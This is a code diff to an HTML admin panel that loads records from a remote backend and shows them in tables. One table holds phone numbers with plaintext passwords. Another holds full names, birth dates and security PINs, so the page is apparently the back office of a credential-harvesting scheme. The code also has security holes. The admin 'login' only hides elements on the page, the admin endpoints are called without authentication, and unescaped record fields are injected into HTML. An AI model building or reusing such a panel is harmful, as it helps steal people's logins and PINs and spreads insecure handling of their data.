@@ -131,30 +131,36 @@ input {
 </div>
 
 <script>
-
-// 🔥 APNA BACKEND URL YAHAN LAGAO
+// 🔥 Set your deployed backend URL
 const BASE_URL = "https://sprodeal-backend-5.onrender.com";
 
 // ---------------- ADMIN LOGIN ----------------
 async function adminLogin() {
-    let pass = document.getElementById("adminPass").value;
+    const pass = document.getElementById("adminPass").value.trim();
+    if (!pass) return alert("Please enter password");
 
-    const res = await fetch(`${BASE_URL}/admin-login`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ password: pass })
-    });
+    try {
+        const res = await fetch(`${BASE_URL}/admin-login`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ password: pass })
+        });
 
-    const data = await res.json();
+        const data = await res.json();
 
-    if (data.success) {
-        document.getElementById("loginBox").style.display = "none";
-        document.getElementById("adminPanel").style.display = "block";
-    } else {
-        alert(data.message);
+        if (data.success) {
+            document.getElementById("loginBox").style.display = "none";
+            document.getElementById("adminPanel").style.display = "block";
+        } else {
+            alert(data.message || "Login failed");
+        }
+    } catch (err) {
+        console.error("Admin Login Error:", err);
+        alert("Error connecting to server");
     }
 }
 
+// Logout
 function logout() {
     document.getElementById("adminPanel").style.display = "none";
     document.getElementById("loginBox").style.display = "block";
@@ -164,118 +170,174 @@ function logout() {
 
 // ---------------- USERS TABLE ----------------
 async function loadUsers() {
-    document.getElementById("tableArea").innerHTML = "<h3>Loading...</h3>";
+    const tableArea = document.getElementById("tableArea");
+    tableArea.innerHTML = "<h3>Loading...</h3>";
 
-    const res = await fetch(`${BASE_URL}/admin/getUsers`);
-    let data = await res.json();
+    try {
+        const res = await fetch(`${BASE_URL}/admin/getUsers`);
+        const data = await res.json();
 
-    let html = `
-    <h2>Login Data</h2>
-    <table>
-        <tr>
-            <th>ID</th><th>Phone</th><th>Password</th><th>Date</th><th>Action</th>
-        </tr>
-    `;
+        if (!Array.isArray(data)) {
+            tableArea.innerHTML = "<p>No users found.</p>";
+            return;
+        }
 
-    data.forEach(r => {
-        html += `
-        <tr>
-            <td>${r._id}</td>
-            <td>${r.phone}</td>
-            <td>${r.password}</td>
-            <td>${r.createdAt ? new Date(r.createdAt).toLocaleString() : "-"}</td>
-            <td>
-                <button class="update-btn" onclick="openUpdate('${r._id}', '${r.phone}', '${r.password}')">Update</button>
-                <button class="delete-btn" onclick="deleteUser('${r._id}')">Delete</button>
-            </td>
-        </tr>`;
-    });
+        let html = `
+        <h2>Login Data</h2>
+        <table>
+            <tr>
+                <th>ID</th><th>Phone</th><th>Password</th><th>Date</th><th>Action</th>
+            </tr>`;
 
-    html += "</table>";
-    document.getElementById("tableArea").innerHTML = html;
+        data.forEach(r => {
+            html += `
+            <tr>
+                <td>${r._id}</td>
+                <td>${r.phone}</td>
+                <td>${r.password}</td>
+                <td>${r.createdAt ? new Date(r.createdAt).toLocaleString() : "-"}</td>
+                <td>
+                    <button class="update-btn" onclick="openUpdate('${r._id}','${r.phone}','${r.password}')">Update</button>
+                    <button class="delete-btn" onclick="deleteUser('${r._id}')">Delete</button>
+                </td>
+            </tr>`;
+        });
+
+        html += "</table>";
+        tableArea.innerHTML = html;
+
+    } catch (err) {
+        console.error("Load Users Error:", err);
+        tableArea.innerHTML = "<p>Error fetching users.</p>";
+    }
 }
 
+// ---------------- UPDATE POPUP ----------------
 let updateUserId = null;
-
 function openUpdate(id, phone, pass) {
     updateUserId = id;
     document.getElementById("updPhone").value = phone;
     document.getElementById("updPassword").value = pass;
     document.getElementById("updatePopup").style.display = "flex";
 }
+
 function closePopup() {
     document.getElementById("updatePopup").style.display = "none";
 }
 
 async function saveUpdate() {
-    let phone = document.getElementById("updPhone").value;
-    let pass = document.getElementById("updPassword").value;
+    const phone = document.getElementById("updPhone").value.trim();
+    const pass = document.getElementById("updPassword").value.trim();
 
-    await fetch(`${BASE_URL}/admin/updateUser/${updateUserId}`, {
-        method: "PUT",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({phone, password: pass})
-    });
+    if (!phone || !pass) return alert("Enter phone and password");
 
-    alert("Updated successfully!");
-    closePopup();
-    loadUsers();
+    try {
+        const res = await fetch(`${BASE_URL}/admin/updateUser/${updateUserId}`, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, password: pass })
+        });
+
+        const data = await res.json();
+        if (data.success) {
+            alert("Updated successfully!");
+            closePopup();
+            loadUsers();
+        } else {
+            alert(data.message || "Update failed");
+        }
+    } catch (err) {
+        console.error("Update User Error:", err);
+        alert("Error connecting to server");
+    }
 }
 
+// ---------------- DELETE USER ----------------
 async function deleteUser(id) {
-    if (!confirm("Are you sure?")) return;
+    if (!confirm("Are you sure to delete this user?")) return;
 
-    await fetch(`${BASE_URL}/admin/deleteUser/${id}`, { method: "DELETE" });
+    try {
+        const res = await fetch(`${BASE_URL}/admin/deleteUser/${id}`, { method: "DELETE" });
+        const data = await res.json();
 
-    alert("Deleted!");
-    loadUsers();
+        if (data.success) {
+            alert("Deleted successfully!");
+            loadUsers();
+        } else {
+            alert(data.message || "Delete failed");
+        }
+    } catch (err) {
+        console.error("Delete User Error:", err);
+        alert("Error connecting to server");
+    }
 }
 
 // ---------------- VERIFICATION TABLE ----------------
 async function loadVerification() {
+    const tableArea = document.getElementById("tableArea");
+    tableArea.innerHTML = "<h3>Loading...</h3>";
 
-    document.getElementById("tableArea").innerHTML = "<h3>Loading...</h3>";
+    try {
+        const res = await fetch(`${BASE_URL}/admin/getVerification`);
+        const data = await res.json();
 
-    const res = await fetch(`${BASE_URL}/admin/getVerification`);
-    let data = await res.json();
+        if (!Array.isArray(data)) {
+            tableArea.innerHTML = "<p>No verification data found.</p>";
+            return;
+        }
 
-    let html = `
-    <h2>Verification Data</h2>
-    <table>
-        <tr>
-            <th>ID</th><th>User ID</th><th>Name</th><th>DOB</th>
-            <th>Problem</th><th>PIN</th><th>Experience</th><th>Action</th>
-        </tr>
-    `;
+        let html = `
+        <h2>Verification Data</h2>
+        <table>
+            <tr>
+                <th>ID</th><th>User ID</th><th>Name</th><th>DOB</th>
+                <th>Problem</th><th>PIN</th><th>Experience</th><th>Action</th>
+            </tr>`;
 
-    data.forEach(r => {
-        html += `
-        <tr>
-            <td>${r._id}</td>
-            <td>${r.user_id}</td>
-            <td>${r.full_name}</td>
-            <td>${r.dob ? new Date(r.dob).toLocaleDateString() : "-"}</td>
-            <td>${r.problem}</td>
-            <td>${r.security_pin}</td>
-            <td>${r.experience}</td>
-            <td><button class="delete-btn" onclick="deleteVerification('${r._id}')">Delete</button></td>
-        </tr>`;
-    });
+        data.forEach(r => {
+            html += `
+            <tr>
+                <td>${r._id}</td>
+                <td>${r.user_id}</td>
+                <td>${r.full_name}</td>
+                <td>${r.dob ? new Date(r.dob).toLocaleDateString() : "-"}</td>
+                <td>${r.problem}</td>
+                <td>${r.security_pin}</td>
+                <td>${r.experience}</td>
+                <td><button class="delete-btn" onclick="deleteVerification('${r._id}')">Delete</button></td>
+            </tr>`;
+        });
 
-    html += "</table>";
-    document.getElementById("tableArea").innerHTML = html;
+        html += "</table>";
+        tableArea.innerHTML = html;
+
+    } catch (err) {
+        console.error("Load Verification Error:", err);
+        tableArea.innerHTML = "<p>Error fetching verification data.</p>";
+    }
 }
 
+// ---------------- DELETE VERIFICATION ----------------
 async function deleteVerification(id) {
-    if (!confirm("Are you sure?")) return;
+    if (!confirm("Are you sure to delete this record?")) return;
 
-    await fetch(`${BASE_URL}/admin/deleteVerification/${id}`, { method: "DELETE" });
+    try {
+        const res = await fetch(`${BASE_URL}/admin/deleteVerification/${id}`, { method: "DELETE" });
+        const data = await res.json();
 
-    alert("Deleted!");
-    loadVerification();
+        if (data.success) {
+            alert("Deleted successfully!");
+            loadVerification();
+        } else {
+            alert(data.message || "Delete failed");
+        }
+    } catch (err) {
+        console.error("Delete Verification Error:", err);
+        alert("Error connecting to server");
+    }
 }
-
 </script>
+
 
 </body>
 </html>
